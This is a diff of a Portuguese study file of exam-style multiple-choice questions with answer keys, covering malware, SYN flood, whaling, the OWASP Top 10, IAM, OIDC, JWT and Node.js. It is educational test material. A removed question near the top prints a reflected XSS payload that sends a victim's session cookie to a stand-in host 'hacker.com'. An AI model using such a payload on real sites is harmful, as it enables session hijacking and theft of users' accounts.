@@ -2,909 +2,885 @@
 
 ## 📝 TEMA 1: Segurança da Informação (Ameaças, OWASP, IAM e OIDC)
 
-### Questão 1 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Um Tribunal Estadual implementou uma nova página de consulta processual. O Analista de Segurança, durante um pentest (teste de invasão), inseriu no campo de busca de processos a string `<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>`. Ao pesquisar, a página não sanitizou o input, e o script foi refletido diretamente na tela do navegador, enviando o cookie de sessão do analista para o servidor remoto. Segundo o OWASP Top 10 (2021), esse clássico vetor de ataque de injeção client-side é denominado:
-A) SQL Injection (SQLi).
-B) Cross-Site Request Forgery (CSRF).
-C) Cross-Site Scripting (XSS).
-D) Broken Access Control.
-E) Server-Side Request Forgery (SSRF).
+### Questão 1 (FCC - TRE - Analista de Segurança)
+No estudo de malwares e ameaças virtuais, os conceitos de vírus e worm descrevem comportamentos de infecção distintos. A diferença fundamental entre um vírus e um worm reside no fato de que:
+A) O vírus é autônomo e se propaga de forma independente pela rede explorando vulnerabilidades ativas, enquanto o worm exige um arquivo hospedeiro e a ação direta de execução do usuário.
+B) O vírus exige a presença de um arquivo ou programa hospedeiro no sistema e a execução humana para se propagar; o worm é autônomo, replica-se de forma ativa e viaja de máquina em máquina por meio de conexões de rede de forma automática.
+C) O vírus opera na camada de aplicação do modelo OSI e o worm atua exclusivamente na camada física de transmissão de pacotes.
+D) O worm criptografa os dados do disco rígido solicitando resgate em dinheiro, ao passo que o vírus apaga silenciosamente os arquivos do sistema operacional.
+E) O vírus é propagado unicamente via cabos de manobra de rede local, enquanto o worm exige conexões de internet por satélite.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
-**Gabarito: C**
+**Gabarito: B**
 
-- C) Correta. O XSS (Cross-Site Scripting) ocorre quando a aplicação web inclui dados não confiáveis em uma página web sem a devida validação ou escape. Como o script injetado rodou no navegador (client-side) roubando o cookie, trata-se de um XSS Refletido.
+- B) Correta. O vírus é um malware dependente: necessita "pegar carona" em um arquivo hospedeiro e requer que um usuário execute esse arquivo infectado. O worm (verme) é um programa independente: ele não altera outros programas, propaga-se de forma autônoma pela rede explorando falhas de segurança em sistemas vizinhos.
 </details>
 
-### Questão 2 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Um engenheiro de segurança foi acionado porque a rede do Tribunal sofreu indisponibilidade severa. Analisando os logs de borda, constatou-se que os servidores web não haviam sido comprometidos, mas suas portas de entrada estavam sendo inundadas por 50 milhões de requisições malformadas de SYN Flood por segundo, originadas simultaneamente de milhares de câmeras IP e roteadores domésticos infectados globalmente. Essa tipologia de ataque é estritamente classificada como:
-A) Ransomware de dupla extorsão.
-B) Ataque de Força Bruta de Senhas.
-C) DDoS (Distributed Denial of Service) volumétrico.
-D) Injeção de Comandos de Sistema Operacional.
-E) Phishing direcionado.
+---
+
+### Questão 2 (FCC - TRT - Analista de Redes)
+O ataque de SYN Flood é um tipo comum de Denial of Service (DoS) que explora vulnerabilidades no protocolo TCP. Esse ataque consiste em inundar o servidor com pacotes SYN, visando exaurir seus recursos porque:
+A) O invasor envia chaves de criptografia assimétricas inválidas, travando a CPU do roteador de borda.
+B) O servidor responde com pacotes SYN-ACK e aloca recursos em memória esperando pelo pacote ACK final do handshake de três vias (three-way handshake), que nunca é enviado pelo atacante, deixando as conexões em estado semiaberto.
+C) O ataque força o servidor a reiniciar o sistema operacional Linux local em modo de segurança.
+D) A inundação de pacotes apaga as tabelas de roteamento dinâmico OSPF na sub-rede pública.
+E) O switch de rede é obrigado a desativar as portas físicas de entrada do rack de servidores.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
-**Gabarito: C**
+**Gabarito: B**
 
-- C) Correta. Trata-se de um ataque Distribuído de Negação de Serviço (DDoS). Como a inundação provém de milhares de IPs distintos (botnet), o firewall tem enorme dificuldade de mitigar a sobrecarga.
+- B) Correta. O SYN Flood explora o handshake TCP. O atacante envia múltiplos pacotes SYN com IPs de origem falsificados. O servidor aloca memória para cada conexão, responde com SYN-ACK e aguarda o ACK final. Como o atacante não envia o ACK (ou o IP falso não responde), o servidor esgota suas tabelas de conexões pendentes (backlog queue), ficando indisponível para conexões legítimas.
 </details>
 
-### Questão 3 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Um magistrado de alta patente do TRT recebeu um e-mail urgente, com a logomarca perfeita da presidência, exigindo que ele clicasse num link e digitasse sua credencial institucional para 'evitar a exclusão sumária do seu token eletrônico de processos'. Nenhum outro servidor recebeu este e-mail; o ataque foi desenhado exclusivamente para ele, usando dados de sua rotina. Esta variação cirúrgica e altamente personalizada de engenharia social voltada a alvos de altíssimo escalão é conhecida como:
-A) Adware.
-B) Vishing (Voice Phishing).
-C) Whaling (Phishing de Baleia).
+---
+
+### Questão 3 (FCC - TJ - Analista Judiciário)
+A engenharia social utiliza manipulação psicológica para obter informações confidenciais. Um analista identificou um ataque voltado exclusivamente a juízes seniores e desembargadores do tribunal, simulando mensagens personalizadas de órgãos superiores de controle para capturar credenciais de MFA. Esse ataque altamente direcionado a indivíduos de alto escalão é denominado:
+A) Spamming massivo.
+B) Whaling.
+C) Vishing.
 D) Pharming de DNS.
-E) Worm de e-mail massivo.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O Phishing comum é jogado ao mar para qualquer um. O Spear Phishing é direcionado a uma pessoa/grupo. O *Whaling* (pesca da baleia) é focado exclusivamente em executivos C-level, diretores ou altas autoridades.
-</details>
-
-### Questão 4 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-No OWASP Top 10 de 2021, a categoria que saltou para a posição número 1 (A01) refere-se a falhas que permitem que um usuário atue fora de suas permissões pretendidas. Um exemplo ocorre quando o usuário logado `Joao123` percebe que a URL do seu painel é `site.com/perfil?id=50`. Ele manualmente altera a URL para `id=51` e consegue ler e editar livremente os dados sensíveis da usuária `Maria456`. Esta vulnerabilidade específica é o cerne do:
-A) Insecure Design (Design Inseguro).
-B) Cryptographic Failures (Falhas Criptográficas).
-C) Broken Access Control (Quebra de Controle de Acesso).
-D) Security Misconfiguration (Configuração Insegura).
-E) Vulnerable and Outdated Components.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. A Quebra de Controle de Acesso (Broken Access Control) assumiu a liderança do OWASP. O exemplo dado é a clássica IDOR.
-</details>
-
-### Questão 5 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Para modernizar a autenticação de cidadãos no portal de serviços, a equipe de TI do TJ optou por utilizar o protocolo federado do gov.br. O arquiteto explicou: 'Nós usaremos o OAuth 2.0 sob o capô, mas o OAuth 2.0 puro só provê um *Access Token* opaco (autorização para acessar APIs). Para que nosso portal saiba **quem** é o usuário (Nome, CPF, E-mail autenticado), precisamos adicionar a camada padronizada que envelopa o *ID Token* formatado em JWT por cima do OAuth 2.0'. Essa camada de identidade descrita pelo arquiteto é o:
-A) SAML 2.0.
-B) LDAP v3.
-C) OpenID Connect (OIDC).
-D) Kerberos e Active Directory.
-E) X.509 Certificates.
-
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O OpenID Connect (OIDC) é o padrão de Identidade construído no topo do protocolo de Autorização OAuth 2.0.
-</details>
-
-### Questão 6 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Durante uma auditoria de segurança da infraestrutura AWS de um Tribunal, identificou-se que a base de dados principal de estagiários foi exposta publicamente. A falha ocorreu porque o estagiário criou um bucket S3 e, por falta de conhecimento, marcou a permissão nativa 'Public Read' no console, esquecendo-se também de desabilitar o painel padrão do Apache Tomcat exposto na porta 8080. Na categorização do OWASP Top 10 (2021), essas falhas logísticas operacionais puras não são falhas de código, mas sim:
-A) A03: Injection.
-B) A05: Security Misconfiguration (Configuração Insegura de Segurança).
-C) A08: Software and Data Integrity Failures.
-D) A10: Server-Side Request Forgery.
-E) A02: Cryptographic Failures.
+E) Ransomware lateral.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. A Configuração Insegura é o risco associado a configurações padrão não alteradas e portas expostas indevidamente.
+- B) Correta. O ataque de *Whaling* (pesca da baleia) é uma variante de Phishing/Spear Phishing direcionada especificamente a alvos de alto perfil (executivos, magistrados, diretores). Ele se diferencia pela extrema personalização do contexto e pelo alto nível hierárquico das vítimas.
 </details>
 
-### Questão 7 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Uma servidora pública conectou um pen-drive achado no estacionamento em seu computador de trabalho. Silenciosamente, o software contido no pen-drive se instalou na memória e começou a rastrear as teclas digitadas, enviando as senhas do sistema processual para um servidor na Rússia, sem que os arquivos normais do PC fossem corrompidos. O tipo específico de malware projetado primariamente para este fim é o:
-A) Ransomware de Criptografia.
-B) Worm Autopropagável.
-C) Spyware (especificamente da categoria Keylogger).
-D) Adware focado em banners pop-up.
-E) Botnet Herder.
+---
+
+### Questão 4 (FCC - DPE - Analista de TI)
+Um usuário malicioso acessou o painel de consulta do tribunal e alterou manualmente o parâmetro da URL de `site.com/dados?id=200` para `id=201`. O sistema renderizou os dados privados de outro cidadão sem exigir nova validação de acesso. Segundo o OWASP Top 10 (2021), essa falha de segurança está classificada na categoria:
+A) A04: Insecure Design.
+B) A05: Security Misconfiguration.
+C) A01: Broken Access Control (Quebra de Controle de Acesso).
+D) A02: Cryptographic Failures.
+E) A10: Server-Side Request Forgery.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Spyware é o malware espião focado em coletar dados sem o consentimento da vítima. O keylogger é a variante que mapeia digitação de teclado.
+- C) Correta. A falha descrita é o IDOR (Insecure Direct Object Reference), que ocorre quando a aplicação permite que um usuário acesse recursos de terceiros manipulando IDs. Ela pertence à categoria principal do OWASP Top 10 (2021): A01 - Broken Access Control (Quebra de Controle de Acesso).
 </details>
 
-### Questão 8 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Um Arquiteto de IAM de um órgão governamental deve configurar a política de permissões na nuvem. Ele define que um novo Analista Jr. deve receber estritamente o acesso à tabela A, negando explicitamente as tabelas B, C e qualquer painel administrativo, garantindo que ele tenha acesso APENAS aos privilégios essenciais para executar sua função diária, nada mais. O princípio basal da segurança aplicado aqui é o:
-A) Princípio do Menor Privilégio (Least Privilege).
-B) Segregação de Funções (Segregation of Duties).
-C) Segurança por Obscuridade.
-D) Zero Trust Network Access dinâmico.
-E) Single Sign-On (SSO).
+---
+
+### Questão 5 (FCC - TRF - Arquiteto de Software)
+Uma equipe de segurança avaliou as tecnologias de gerenciamento de identidade para federar o acesso a múltiplos portais. O arquiteto recomendou a adoção do OpenID Connect (OIDC) em substituição ao uso isolado do OAuth 2.0. A justificativa correta para essa recomendação é que:
+A) O OAuth 2.0 é um protocolo focado em criptografar dados em repouso no SGBD, ao passo que o OIDC realiza a descriptografia em trânsito.
+B) O OAuth 2.0 é um framework projetado estritamente para autorização (retornando um Access Token opaco para APIs), enquanto o OIDC adiciona uma camada de identidade e autenticação por cima, fornecendo um ID Token formatado em JWT com dados legíveis do usuário.
+C) O OIDC dispensa o tráfego do protocolo HTTPS, reduzindo a latência da autenticação.
+D) O OAuth 2.0 exige o armazenamento do estado da sessão do cliente no servidor, violando a restrição REST, o que é corrigido pelo OIDC.
+E) O OIDC atua como firewall de camada 7 bloqueando injeções de SQL.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
-**Gabarito: A**
+**Gabarito: B**
 
-- A) Correta. O Princípio do Menor Privilégio afirma que os usuários devem ter apenas os níveis de acesso estritamente necessários para a conclusão de suas tarefas.
+- B) Correta. OAuth 2.0 é focado em delegação de acesso/autorização (emite tokens para dar acesso a APIs, mas não diz ao cliente quem é o usuário autenticado). O OpenID Connect (OIDC) estende o OAuth 2.0 fornecendo autenticação e identidade por meio de um token JWT padronizado (o ID Token), que contém informações estruturadas sobre o usuário.
 </details>
 
-### Questão 9 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-No ecossistema corporativo, é comum possuir múltiplos serviços de Back-end e Portais. Para evitar o 'fadiga de senhas' onde o usuário precisa decorar 15 senhas diferentes, implementa-se um Gateway de Identidade onde o login é efetuado uma única vez e o token JWT repassado aos aplicativos. Este conceito de autenticação centralizada unificada é conhecido como:
-A) Cross-Site Request Forgery.
-B) Two-Factor Authentication (2FA).
-C) Single Sign-On (SSO).
-D) Biometria OAUTH-2.
-E) Role-Based Access Control (RBAC).
+---
+
+### Questão 6 (FCC - SEFAZ - Tecnologia da Informação)
+A categoria "Security Misconfiguration" (A05) do OWASP Top 10 (2021) é frequentemente decorrente de falhas operacionais e de administração de sistemas. Assinale o cenário que configura essa vulnerabilidade:
+A) O desenvolvedor utilizou um loop de busca sequencial ineficiente no backend.
+B) A equipe deixou ativas as senhas e usuários padrões de fábrica (default credentials) de um painel de administração exposto publicamente na internet.
+C) A aplicação sofreu estouro de memória (out of memory) devido a vazamento de memória em rotinas JavaScript.
+D) O banco de dados foi modelado na 1FN ao invés da 3FN, permitindo anomalias de exclusão.
+E) O navegador do usuário bloqueou a execução de scripts devido ao cabeçalho CORS.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. A configuração insegura (Security Misconfiguration) envolve manter contas padrões habilitadas, expor portas lógicas desnecessárias, manter mensagens de erro com stack trace detalhado em produção e expor buckets ou consoles sem autenticação adequada.
+</details>
+
+---
+
+### Questão 7 (FCC - TJ - Administrador de Redes)
+Dentre as ameaças cibernéticas, o spyware é projetado para atuar de forma oculta no sistema operacional. Um tipo específico de spyware que intercepta fisicamente ou via software todas as teclas digitadas pelo usuário no teclado físico do host, visando capturar credenciais de acesso bancário ou senhas do tribunal, é denominado:
+A) Rootkit.
+B) Keylogger.
+C) Adware.
+D) Trojan Banker.
+E) Ransomware WORM.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O Keylogger é o malware da família dos spywares especializado em gravar tudo o que é digitado no teclado físico ou virtual do computador, enviando esses dados de volta para o atacante de forma periódica.
+</details>
+
+---
+
+### Questão 8 (FCC - TRT - Analista Judiciário)
+O Princípio do Menor Privilégio (Least Privilege) dita as diretrizes de governança de acessos no IAM (Identity and Access Management). Este princípio determina que:
+A) Todas as permissões administrativas devem ser concedidas temporariamente a todos os colaboradores da TI.
+B) Contas de estagiários devem possuir acessos de gravação irrestritos aos bancos de produção.
+C) Os usuários e processos do sistema devem possuir apenas os acessos e permissões estritamente necessários para desempenhar suas funções de negócio designadas, mitigando riscos de abusos ou vazamentos de dados.
+D) As chaves de criptografia assimétrica devem ser compartilhadas via redes de e-mail institucionais abertas.
+E) A segurança deve ser baseada no ocultamento da estrutura de diretórios dos servidores web.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. O SSO (Single Sign-On) é a capacidade de um usuário se autenticar apenas uma vez em um provedor e acessar múltiplos sistemas distintos.
+- C) Correta. O Princípio do Menor Privilégio afirma que um usuário, conta ou processo deve ter apenas os privilégios mínimos necessários para realizar suas tarefas. Isso limita o impacto de incidentes e invasões acidentais ou intencionais.
 </details>
 
-### Questão 10 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Na sexta-feira, toda a infraestrutura Windows do Tribunal foi congelada. As telas exibiam um cronômetro regressivo com uma mensagem vermelha instruindo o presidente a transferir 50 Bitcoins, ou então as chaves usadas para travar as tabelas seriam apagadas permanentemente. Qual malware tem como característica central essa modalidade?
-A) Trojan Horse Financeiro.
-B) Phishing de Extorsão.
+---
+
+### Questão 9 (FCC - TJ - Tecnologia da Informação)
+Para evitar que os funcionários de um órgão público precisem se autenticar individualmente em cada um dos 12 sistemas internos da intranet utilizando credenciais distintas para cada aplicação, a TI implementou uma solução de Single Sign-On (SSO). O principal objetivo do SSO é:
+A) Forçar o uso de criptografia simétrica local nos notebooks institucionais.
+B) Permitir que o usuário realize o login uma única vez em um provedor de identidade centralizado (IdP) e ganhe acesso automático aos sistemas autorizados sem necessidade de digitar credenciais novamente.
+C) Bloquear ataques do tipo DDoS na camada física de transporte da rede.
+D) Automatizar o backup periódico de todos os e-mails e arquivos de blocos.
+E) Limitar a navegação em sites civis durante o horário de expediente de forma física.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. O Single Sign-On (SSO) é um mecanismo de autenticação de sessão que permite que um usuário acesse múltiplos aplicativos relacionados e independentes por meio de uma única validação de credenciais em um portal centralizado.
+</details>
+
+---
+
+### Questão 10 (FCC - DPE - Analista de Segurança)
+Um analista detectou que todos os servidores virtuais do órgão pararam de responder. Ao acessar os consoles das instâncias, havia uma mensagem exigindo a transferência de valores monetários em criptomoedas para reaver os dados, que haviam sido submetidos a um processo de encriptação forte. O malware responsável por este vetor de extorsão é o:
+A) Spyware.
+B) Worm.
 C) Ransomware.
-D) Rootkit profundo de kernel.
-E) Vírus de Macro.
+D) Trojan Horse.
+E) Rootkit.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Ransom (Resgate) + Software = Ransomware. Ele criptografa arquivos tornando-os ilegíveis e cobra resgate pela chave.
+- C) Correta. O Ransomware é o malware sequestrador de dados. Ele impede o acesso das vítimas aos seus próprios arquivos criptografando-os e exige um resgate (normalmente em criptomoedas de difícil rastreamento) para fornecer a chave de descriptografia correspondente.
 </details>
 
-### Questão 11 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Uma nova diretriz determina que, ao acessar sistemas críticos na VPN, além de saber a senha (`Knowledge factor`), o analista deve inserir um código gerado no smartphone (`Possession factor`). Esse requisito de segurança é denominado:
-A) Criptografia Assimétrica.
-B) Autenticação Multifator (MFA / 2FA).
-C) Biometria Baseada em IA.
-D) OpenID Connect Verification.
-E) ABAC.
+---
+
+### Questão 11 (FCC - TRF - Tecnologia da Informação)
+A autenticação multifator (MFA) acrescenta uma camada de proteção ao controle de acessos. Um sistema que exige, além da senha usual do usuário, o preenchimento de um token temporal dinâmico (TOTP) exibido em um aplicativo móvel registrado no smartphone pessoal do funcionário, está combinando, respectivamente, os seguintes fatores:
+A) Algo que você sabe (Knowledge) e Algo que você é (Inherence).
+B) Algo que você sabe (Knowledge) e Algo que você possui (Possession).
+C) Algo que você possui (Possession) e Algo que você faz (Behavior).
+D) Algo que você é (Inherence) e Algo que você faz (Behavior).
+E) Algo que você sabe (Knowledge) e Onde você está (Location).
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. A MFA (Multi-Factor Authentication) exige duas ou mais evidências de categorias diferentes (Saber e Ter).
+- B) Correta. Os fatores de autenticação tradicionais são divididos em: 1) Algo que você sabe (ex: senha, PIN); 2) Algo que você possui/tem (ex: smartphone com token, chaveiro OTP, smartcard); 3) Algo que você é (ex: biometria, reconhecimento facial). A combinação de senha + token dinâmico no celular do próprio usuário é a união dos fatores de Conhecimento (saber) e Posse (possuir).
 </details>
 
-### Questão 12 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Ao analisar a rede, a perícia detectou que o malware não precisou de nenhuma interação humana. Ele se replicou automaticamente explorando uma vulnerabilidade do SMB, caçando ativamente outras máquinas vulneráveis na rede. A característica marcante de autorreplicação via rede sem intervenção humana é típica de qual malware?
-A) Worm (Verme).
-B) Virus de Boot Sector.
-C) Cavalo de Troia (Trojan).
-D) Spyware Rootkit.
-E) Tracking Cookie.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: A**
-
-- A) Correta. A principal diferença entre Vírus e Worm: o WORM viaja de máquina em máquina sozinho, explorando falhas de rede de forma autônoma.
-</details>
-
-### Questão 13 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Uma vulnerabilidade no OWASP Top 10 é o 'Insecure Design' (A04). Um arquiteto não implementou checagens de bot (CAPTCHA) no e-commerce. Um robô esgotou o estoque. Sob a ótica do OWASP, por que essa falha configura um Insecure Design e não Insecure Implementation (bug de código)?
-A) Porque o código escrito não compilava.
-B) Porque o design não usava microsserviços.
-C) Porque uma falha de design (falta de proteção de processos de negócio) não pode ser consertada por um código perfeito sem mudar a arquitetura lógica.
-D) Porque ocorreu Null Pointer Exception.
-E) Porque as senhas estavam em plain text.
+### Questão 12 (FCC - TRE - Administrador de Redes)
+Dentre as ameaças à integridade da rede, o Pharming é uma técnica refinada de ataque que consiste em:
+A) Enviar e-mails em lote simulando promoções comerciais fictícias de grandes magazines.
+B) Corromper o tráfego interceptando cabos de fibra óptica e decodificando pacotes via hardware passivo.
+C) Envenenar o cache de servidores DNS ou alterar arquivos hosts locais, fazendo com que o usuário, ao digitar a URL legítima do tribunal em seu navegador, seja silenciosamente redirecionado para um endereço IP falso correspondente ao site controlado pelo criminoso.
+D) Capturar as teclas digitadas por meio de injeção de scripts XSS na memória RAM.
+E) Bloquear a rede interna por meio de inundação SYN Flood originada de botnets.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. Insecure Design lida com a falta de desenho arquitetural de controles. Código perfeito num fluxo lógico falho não protege o sistema.
+- C) Correta. O Pharming age alterando a resolução de nomes (DNS). Ele envenena a conversão de domínios em IPs de modo que, mesmo que o usuário digite o endereço correto na URL do browser (ex: `trt.jus.br`), ele é guiado pelo DNS corrompido para o IP de um servidor clonado fraudulento, de forma invisível.
 </details>
 
-### Questão 14 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-Um ataque redireciona o tráfego manipulando diretamente a configuração DNS do roteador. O usuário digita perfeitamente `www.bancodobrasil.com.br`, mas é levado a um site falso sem clicar em nenhum link de email. Esta técnica é denominada:
-A) Ransomware Injetável.
-B) Spoofing de MAC Address.
-C) DDoS State Exhaustion.
-D) Pharming.
-E) Sniffing Passivo OSPF.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: D**
-
-- D) Correta. Pharming altera a tabela de DNS ou arquivo hosts. A conversão DNS aponta para o servidor criminoso furtivamente.
-</details>
-
-### Questão 15 (FCC - Questão Prática / Adaptada (Segurança, OWASP e IAM))
-O JWT (JSON Web Token) é divido em 3 partes. O que garante criptograficamente a integridade do JWT, assegurando ao IAM que o token não teve seus atributos adulterados no navegador?
-A) O Header.
-B) A Payload.
-C) A Assinatura (Signature).
-D) O banco PostgreSQL.
-E) O certificado SSL.
+### Questão 13 (FCC - TJ - Administrador de Banco de Dados)
+Na arquitetura do JSON Web Token (JWT), utilizado para controle de acessos sem estado (stateless) em microsserviços REST, a integridade e autenticidade do token emitido pelo IdP, atestando que os dados contidos em seu corpo não sofreram adulterações no cliente, são garantidas por meio de:
+A) Compactação GZIP no cabeçalho do token.
+B) Criptografia AES 256 de todas as chaves.
+C) Assinatura Digital (Signature) gerada a partir de uma chave secreta ou par de chaves assimétricas do emissor.
+D) Uso obrigatório de sub-redes IPSec locais na rede física da AWS.
+E) Filtros WAF que bloqueiam tráfego UDP de entrada nas instâncias.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: C**
 
-- C) Correta. A terceira parte do JWT é a Assinatura (Signature). A assinatura impede que os dados abertos do payload sejam violados.
+- C) Correta. Um JWT é composto por 3 partes codificadas em Base64Url separadas por pontos: Header, Payload e Signature. A assinatura (Signature) é calculada usando o hash do Header e do Payload combinado com um segredo privado (HMAC) ou uma chave privada (RSA/ECDSA). Se o cliente tentar alterar os dados do Payload (como alterar seu cargo de usuário para administrador), a assinatura correspondente não será válida, e o servidor rejeitará o token.
 </details>
+
+---
+
+### Questão 14 (FCC - TRT - Tecnologia da Informação)
+No OWASP Top 10 (2021), a categoria "Insecure Design" (A04) descreve riscos associados a falhas de design e modelo de arquitetura de software. A diferença conceitual entre uma falha de design (Insecure Design) e uma falha de implementação (Insecure Implementation) é que:
+A) A falha de design ocorre devido a erros de sintaxe no código-fonte em TypeScript que impedem a transpilação.
+B) A falha de design decorre de uma modelagem de fluxo de segurança deficiente ou inexistente na fase de concepção da aplicação (ex: ausência de proteção contra abuso de processos de negócio), de forma que mesmo uma implementação sem bugs não sanará o risco estrutural de segurança.
+C) A falha de implementação ocorre quando o arquiteto opta por usar a nuvem AWS no modelo IaaS.
+D) O Insecure Design é mitigável aplicando-se o escape automático de tags HTML nas chamadas REST.
+E) A falha de implementação decorre exclusivamente de logins com credenciais padrões deixadas ativas no servidor Tomcat.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: B**
+
+- B) Correta. A diferença é fundamental na doutrina OWASP: Insecure Design lida com a falta de controles de segurança no planejamento da aplicação (esquecer de projetar barreiras, como não limitar tentativas de login ou não validar fluxos de dados do negócio). Se o design for falho, mesmo que a implementação (código em si) seja impecável e livre de bugs, o software continuará conceitualmente vulnerável.
+</details>
+
+---
+
+### Questão 15 (FCC - SEFAZ - Tecnologia da Informação)
+Um Trojan Horse (Cavalo de Troia) é um malware muito comum que se caracteriza por:
+A) Explorar vulnerabilidades do sistema operacional e se propagar de forma autônoma pela rede corporativa sem interação de arquivos.
+B) Criptografar as tabelas do PostgreSQL e exigir chaves de resgate.
+C) Apresentar-se como um utilitário ou programa legítimo e inofensivo (ex: um jogo ou protetor de tela) para convencer o usuário a instalá-lo, mas executar ações maliciosas ocultas em segundo plano após sua ativação voluntária.
+D) Desativar as portas lógicas do Firewall por meio de inundações volumétricas SYN Flood.
+E) Alterar as chaves estrangeiras de tabelas em 3FN para criar dependências parciais.
+
+<details><summary>🔑 Ver Gabarito e Explicação</summary>
+
+**Gabarito: C**
+
+- C) Correta. O Cavalo de Troia (Trojan Horse) esconde sua carga maliciosa em um arquivo que aparenta ser inofensivo ou útil. Ele depende que o usuário seja enganado para abri-lo ou executá-lo. Ao rodar, ele instala secretamente spywares, backdoors ou bots no sistema.
+</details>
+
+---
 
 ## 📝 TEMA 2: Eng. de Software (JS, TS, Node.js e LLMs)
 
-### Questão 16 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Um Desenvolvedor migrou uma aplicação para Node.js usando o V8. Na produção, ao disparar relatórios PDF pesados em CPU, a API REST web travou e novas requisições entraram em estado pendente. Essa falha ocorreu estruturalmente porque:
-A) Node.js não suporta geração de PDFs.
-B) A arquitetura nativa do Node é baseada em uma única thread principal (Event Loop) para I/O Assíncrono. Tarefas intensivas de bloqueio de CPU travam o laço.
-C) O Garbage Collector do V8 apagou a memória.
-D) Faltou uso de Promises nativas.
-E) Faltou transpilagem para TypeScript.
+### Questão 16 (FCC - TRF - Tecnologia da Informação)
+O Node.js adota uma arquitetura projetada para lidar de forma escalável com grande volume de requisições web simultâneas. O mecanismo central do Node.js responsável por escutar e despachar chamadas de eventos assíncronos e delegar tarefas demoradas de I/O (como leitura de banco ou rede) para o sistema operacional sem interromper a execução do fluxo principal da aplicação é o:
+A) Garbage Collector Heap Builder.
+B) Event Loop (executado sobre a biblioteca libuv).
+C) NPM Registry Package Linker.
+D) Apache Multiprocessing Module.
+E) Babel Compiler Transpiler.
 
 <details><summary>🔑 Ver Gabarito e Explicação</summary>
 
 **Gabarito: B**
 
-- B) Correta. O Event Loop morre sufocado em operações pesadas matemáticas/processuais (CPU-Bound), porque a thread primária fica ocupada.
+- B) Correta. O Event Loop no Node.js (implementado sobre a biblioteca libuv) gerencia a concorrência assíncrona. Ele opera em uma única thread principal, delegando operações pesadas de I/O de rede ou disco ao kernel do sistema operacional ou a uma pool de threads internas. Isso possibilita o modelo "Non-blocking I/O" que atende milhares de conexões em paralelo.
 </details>
 
-### Questão 17 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-O argumento técnico primário dos arquitetos para migrar a interface de React.js para TypeScript (`.ts`) em larga complexidade governamental é que o TypeScript:
-A) Executa diretamente no navegador Chrome mais rápido.
-B) Substitui o Node pelo modelo JVM.
-C) Adiciona um sistema de tipagem estática, detectando erros em tempo de compilação, o que reduz falhas de execução em produção.
-D) Proíbe arrays por segurança.
-E) Roda nativamente no banco de dados.
+---
 
-<details><summary>🔑 Ver Gabarito e Explicação</summary>
-
-**Gabarito: C**
-
-- C) Correta. O superpoder do TypeScript é a segurança de tipos (Static Typing), evitando falhas inesperadas de tipo em runtime.
-</details>
-
-### Questão 18 (FCC - Questão Prática / Adaptada (JS/TS, Node.js e IA LLMs))
-Ao solicitar a um LLM a criação de uma rotina complexa, a IA sugeriu o uso de uma biblioteca exótica e inventou métodos mirabolantes que não existem. Esse fenômeno técnico dos LLMs é conhecido como:
-A) Zero-Day Exploit Training.
-B) Hallucination (Alucinação).
-C) Overfitting Semântico Reativo.
-D) Backpropagation Divergente.
-E) Prompt Injection Direto.
+### Questão 17 (FCC - TJ - Analista de Sistemas)
+Apesar de sua alta eficiência em operações de I/O (I/O-bound), o Node.js possui limitações em cenários específicos. Se uma API RESTful do tribunal desenvolvida em Node.js precisar executar tarefas pesadas de CPU (CPU-bound), como criptografia de arquivos grandes ou cálculos matemáticos intensivos sequenciais, essa API:
+A) Dividirá os cálculos automaticamente por múltiplos cores físicos da CPU usando a thread padrão do Express.js de forma síncrona.
+B) Travará a execução do Event Loop central, bloqueando o processamento de novas requisições de outros usuários até que o processamento sequencial de CPU termine.
+C) Desativará o tráfego de cabeçalhos CORS devido ao estouro de pilha (call stack overflow).
+D) Converterá o código do backend automaticamente para TypeScript estático em tempo de execução.
